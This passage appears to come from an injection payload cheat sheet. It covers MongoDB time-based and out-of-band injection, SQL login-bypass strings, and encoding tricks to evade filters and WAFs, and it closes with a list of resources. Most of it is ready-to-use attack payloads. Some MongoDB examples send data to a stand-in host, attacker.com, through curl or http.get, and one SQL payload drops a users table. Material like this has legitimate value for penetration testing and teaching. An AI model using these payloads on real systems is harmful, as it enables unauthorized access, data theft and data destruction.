- **JavaScript Delay Injection:** Introduces a delay in the query execution using JavaScript’s `sleep()` function. Forces a delay of 5 seconds to observe if the server’s response time is affected, confirming the vulnerability.

```
db.collection.find({ $where: "function() { sleep(5000); return true; }" })
```

- **Conditional Delay:** Delays execution based on a condition. Causes a delay only if a specific condition is true, allowing the attacker to infer information based on the delay.

```
db.collection.find({ $where: "function() { if (this.username == 'admin') { sleep(5000); } return true; }" })
```

### Out-of-Band MongoDB Injection
MongoDB doesn't natively support out-of-band techniques like traditional SQL databases, but certain operations can be manipulated for OOB-like behavior if the environment is misconfigured (e.g., MongoDB running with elevated privileges and network access).

- **Command Injection with Networking:** Attempts to use MongoDB shell or system calls for out-of-band communication. If the `eval()` function is enabled (highly insecure and deprecated), this could run a shell command that communicates with an attacker-controlled server.

```
db.eval("require('child_process').exec('curl http://attacker.com/?data=' + this.field)")
```

- **Malicious `mapReduce` Function:** Attempts to send data to an external server by exploiting a `mapReduce` operation. The map-reduce operation executes JavaScript on the server, potentially sending data to an external server.

```
db.collection.mapReduce(
    function() { emit(this.field, null); },
    function(key, values) {
        require('http').get('http://attacker.com/?key=' + key);
        return null;
    },
    { out: { inline: 1 } }
)
```

# Authentication Bypass Payloads
Authentication bypass via SQL Injection typically involves crafting SQLi payloads that manipulate the authentication logic in such a way that the attacker gains unauthorized access without providing valid credentials. Below are several examples of SQL injection payloads for bypassing authentication.

## Classic Authentication Bypass
Bypass the authentication by modifying the SQL query logic to always return true.

- **Single Quote Bypass:** This payload terminates the username string, introduces an OR condition that is always true (`'1'='1'`), and comments out the rest of the SQL query, bypassing the password check.

```
' OR '1'='1' --
```

- **Double Quote Bypass:** Similar to the single quote example, but using double quotes, which might bypass applications that use double quotes for string literals.

```
" OR "1"="1" --
```

- **Without Comment:** This payload relies on the fact that some SQL engines will implicitly terminate the query, making it effective without needing the comment (`--`).

```
' OR '1'='1'
```

## Tautology-Based Bypass
Exploit tautologies (always true statements) to bypass the authentication check.

- **Basic Tautology:** This payload works similarly to the classic `'1'='1'` but uses different values, which may evade simplistic filters looking specifically for `'1'='1'`.

```
' OR 'a'='a' --
```

- **Numeric Tautology:** A straightforward numeric comparison that always evaluates to true, bypassing the authentication mechanism.

```
' OR 1=1 --
```

- **Using Greater Than Operator:** This payload creates a condition that is always true using a string comparison, which may evade more specific input filters.

```
' OR 'x' > 'a' --
```

## Using Comments for Bypass
Use SQL comments to terminate the SQL query early, bypassing the need for correct credentials.

- **Inline Comment Bypass:** The payload uses an inline comment (`/*`) to terminate the SQL query after the always-true condition, which can bypass certain SQL engines that handle comments differently.

```
' OR '1'='1'/*'
```

- **SQL Block Comment:** This is a straightforward inline comment that terminates the query after the true condition.

```
' OR '1'='1' --
```

- **Nested Comments:** By using nested comments, the payload can bypass filters that simply strip out or block standard comments.

```
'/**/OR/**/'1'/**/=/**/'1' --
```

## Blind Authentication Bypass
Use SQL Injection in scenarios where the response does not explicitly show whether the injection was successful.

- **Boolean-Based Blind SQLi:** This payload adds a `LIMIT 1` clause, which might bypass the authentication by returning a single valid row when the condition is true.

```
' OR 1=1 LIMIT 1 --
```

- **Using `AND` for Blind SQLi:** The payload ensures that the condition is true using `AND`. This can be used in scenarios where you need to confirm a condition without altering the logic too drastically.

```
' AND 1=1 --
```

- **Case Sensitivity Exploit:** A variation that might bypass filters that are case-sensitive, particularly those looking for lowercase SQL keywords like `or`.

```
' oR 'A'='A' --
```

## Compound Payloads for Bypass
Combine different techniques to create more complex bypass payloads that evade more sophisticated defenses.

- **Multiple Conditions:** This payload adds multiple true conditions, which can evade basic filters that only look for single conditions like `'1'='1'`.

```
' OR '1'='1' AND 'a'='a' --
```

- **Mixed Numeric and String Tautology:** A combination of numeric and string tautologies, potentially useful in situations where filters are looking for only one type of condition.

```
' OR 1=1 AND 'a'='a' --
```

- **Nested SQL Queries:** This payload checks if the `admin` username exists, which can be used in situations where the application allows nested queries.

```
' OR EXISTS (SELECT 1 FROM users WHERE username='admin') --
```

## Bypassing with Logical Operators
Use different logical operators to bypass the authentication logic.

- **Using `OR` with a Null Check:** The payload checks if the username is `NULL`, which might trigger a bypass if the application doesn't handle `NULL` values properly.

```
' OR username IS NULL --
```

- **Using `OR` with Length Comparison:** This payload checks if the length of the username is greater than zero, which is always true if a username exists, potentially bypassing the login.

```
' OR LENGTH(username) > 0 --
```

- **Using `OR` with Substring Check:** This payload extracts the first character of the username and checks if it is `a`. If the application is vulnerable and doesn't properly sanitize input, this could bypass the authentication.

```
' OR SUBSTRING(username, 1, 1) = 'a' --
```

## Bypassing Authentication with Time Delays (Time-Based SQLi)
Exploit time-based SQL Injection to bypass authentication by causing a delay that confirms the payload is being processed.

- **Basic Time Delay:** This payload causes a 5-second delay if the condition is true, which can help confirm the injection and potentially bypass the authentication.

```
' OR IF(1=1, SLEEP(5), 0) --
```

- **Time-Based Bypass with Comparison:** This payload checks if the `admin` username exists and causes a delay if true, potentially bypassing the authentication.

```
' OR IF((SELECT username FROM users WHERE username='admin')='admin', SLEEP(5), 0) --
```

- **Delayed Login Response:** The payload introduces a time delay without conditions, which might be used to confirm the vulnerability in scenarios where a delay in response indicates a successful bypass.

```
' OR SLEEP(5) --
```

# Bypassing Defenses
Bypassing defenses against SQLi involves understanding and evading common security measures implemented in web applications. Attackers use various techniques to evade filters and security mechanisms.

## Obfuscation Techniques
Evade basic filtering mechanisms by altering the appearance of the SQL payload without changing its logic.

- **Using Case Variations:** Altering the case of SQL keywords can sometimes bypass filters that are case-sensitive or only detect specific cases.

```
' OR 1=1 --
' oR 1=1 --
' Or 1=1 --

SELECT * FROM users WHERE username = 'AdMiN' OR '1'='1';
```

- **Comment Injection:** Using comments (`/**/`) to break up keywords can bypass filters that look for specific strings like `OR '1'='1'`.

```
SELECT * FROM users WHERE username = 'admin'/**/OR/**/'1'='1';
```

- **Using Inline Comments:** Inserting comments (`/**/`) between keywords can bypass filters that do not account for such obfuscation.

```
' OR/**/1=1 --
' OR 1/**/=/**/1 --

SELECT * FROM users WHERE username = 'admin'--' AND password = 'password';
```

- **Using String Concatenation:** Using string concatenation operators (`||` or `+`) can bypass filters by breaking up the payload.

```
' OR '1'='1 --
' OR 'A'||'B'='AB' --
```

## Bypassing Input Sanitization
Exploit weaknesses in input sanitization mechanisms that fail to correctly handle specific characters or sequences.

- **Using URL Encoding:** URL encoding special characters (e.g., `%27` for `'`) can bypass input validation that doesn't decode the input before sanitization.

```
%27%20OR%201%3D1%20--

SELECT * FROM users WHERE username = 'admin'%20OR%20'1'%3D'1';
```

- **Double URL Encoding:** Double encoding the input can bypass input validation routines that only decode once.

```
%2527%2520OR%25201%253D1%2520--

SELECT * FROM users WHERE username = '%2561%2564%256D%2569%256E' OR '1'='1';
```

- **Using Char Functions:** Using `CHAR()` or similar functions to represent characters as their ASCII values can bypass filters that look for specific strings like `'1=1'`.

```
' OR CHAR(49)=CHAR(49) --
```

## White-Space and Comment Manipulation
Use alternative whitespace or comments to bypass strict filtering.

- **Tab Character as Whitespace:** Using tab (`\t`) or newline (`\n`) characters instead of spaces can bypass filters that don't normalize whitespace.

```
'/**/OR/**/'1'='1

SELECT * FROM users WHERE username = 'admin'OR'1'='1';
```

- **Using Parentheses and Comments:** Wrapping conditions in parentheses and using comments to obfuscate logical operators can bypass simplistic filters.

```
SELECT * FROM users WHERE (username = 'admin')/**/OR/**/('1'='1');
```

- **Newline Bypass:** Placing parts of the payload on different lines can bypass filters that don't handle multi-line inputs properly.

```
SELECT * FROM users WHERE username = 'admin'OR '1'='1';
```

## Bypassing Specific Blacklist Filters
Evade filters that specifically block certain keywords or phrases.

- **Using SQL Keywords in Unusual Places:** Placing SQL keywords like `WHERE` in unexpected places can bypass filters that only look for certain patterns.

```
' UNION SELECT null, null, null WHERE 1=1 --
```

- **Using SQL Keywords as Identifiers:** Using SQL keywords as identifiers (e.g., table or column names) can evade filters that do not account for this possibility.

```
' OR 'SELECT'='SELECT' --
```

- **Using Alternative SQL Syntax:** Using alternative operators (e.g., `<>` instead of `!=`) can bypass filters looking for specific patterns.

```
' OR 1<>0 --
```

## Bypassing Input Length Restrictions
Evade defenses that restrict the length of the input to prevent long payloads.

- **Using Shortened Payloads:** Shortening the payload to the minimum necessary length can evade input length restrictions while still achieving the injection.

```
' OR '1'='1 --
```

- **Using Multiple Short Injections:** Breaking the payload into multiple short injections can sometimes bypass restrictions that only allow a single injection attempt.

```
' OR 1=1 --
' OR 1=2 --
```

- **Using Subqueries:** Using subqueries can often bypass length restrictions while still performing a valid injection.

```
' OR EXISTS(SELECT 1) --
```

## Bypassing WAFs and IDS/IPS
Craft payloads that evade detection by Web Application Firewalls (WAFs) and Intrusion Detection/Prevention Systems (IDS/IPS).

- **Using Hexadecimal Encoding:** Using hexadecimal encoding (`0x31` for `'1'`) can evade filters that do not properly decode hex values.

```
' OR 0x31=0x31 --

SELECT * FROM users WHERE username = 0x61646d696e OR '1'='1';
```

- **Unicode Encoding:** Using `N''` for Unicode strings can sometimes bypass filters that expect plain ASCII characters.

```
SELECT * FROM users WHERE username = N'admin' OR N'1' = N'1';
```

- **Using Concatenation with SQL Functions:** Concatenating strings using `CONCAT()` can bypass filters looking for specific sequences like `'1=1'`.

```
' OR CONCAT('a','b')='ab' --

SELECT * FROM users WHERE username = CONCAT('ad', 'min') OR '1'='1';
```

- **Using Nested Queries:** Complex nested queries can confuse WAFs that are not designed to parse multi-level SQL logic.

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --
```

- **Using Alternative Keywords:** Some WAFs block the `UNION` keyword. Using `UNION ALL` instead can bypass these filters.

```
SELECT * FROM users WHERE username = 'admin' UNION ALL SELECT 1, 'a', 'b'--
```

## Advanced Techniques
Use advanced SQL features or lesser-known syntax to bypass defenses.

- **Using Substring Comparisons:** Comparing substrings can bypass filters looking for full string comparisons.

```
' OR SUBSTRING('abc', 1, 1)='a' --
```

- **Using Database-Specific Functions:** Using database-specific functions (e.g., `IFNULL()` in MySQL) can evade generic filters not tailored for specific SQL dialects.

```
' OR IFNULL(1, 1/0) --
```

- **Bypassing Filters with Logical Inconsistencies:** Introducing logical inconsistencies or redundant logical operators can sometimes bypass simplistic filters.

```
' OR 1=1 -- -'
```

- **Polyglot Payloads:** Create payloads that work in multiple contexts and can bypass context-specific filters.

```
' UNION SELECT null, null, null; DROP TABLE users --
```

## Compound Payloads
Combine multiple techniques to create a more complex, harder-to-detect payload.

- **Encoded and Obfuscated:** This payload combines Unicode strings, comments, and URL encoding to bypass various layers of filtering.

```
SELECT * FROM users WHERE username = N'admin'/**/OR/**/N'1'%3D%271%27;
```

- **Mixed Case, Comments, and Encodings:** The payload uses mixed case, inline comments, and hexadecimal encoding to bypass different filters.

```
SELECT * FROM users WHERE UsErNaMe = N'admin' UNION/**/SELECT/**/NULL,0x61646d696e,@@version#;
```

- **Using `EXEC` with Obfuscation:** By using dynamic execution with `EXEC` and concatenating parts of the SQL keywords, this payload can bypass static keyword filters.

```
EXEC ('SE' + 'LECT * FROM users WHERE username = ''admin'' OR 1=1');
```

## Database-Specific Techniques

- **Exploiting DBMS Functions:** Use DBMS-specific functions to bypass filters.

```
' AND LENGTH((SELECT database()))>0 --
```

# Resources

|**Website**|**URL**|
|-|-|
|OWASP SQL Injection|https://owasp.org/www-community/attacks/SQL_Injection|
|PortSwigger Web Security Academy|https://portswigger.net/web-security/sql-injection|
|SQLMap Tool|https://sqlmap.org/|
|PayloadAllTheThings (SQL Injection)|https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection|
|HackTricks SQL Injection Guide|https://book.hacktricks.xyz/pentesting-web/sql-injection|
|Exploit Database SQL Injection Exploits|https://www.exploit-db.com/|
|FuzzDB (SQL Injection Payloads)|https://github.com/fuzzdb-project/fuzzdb|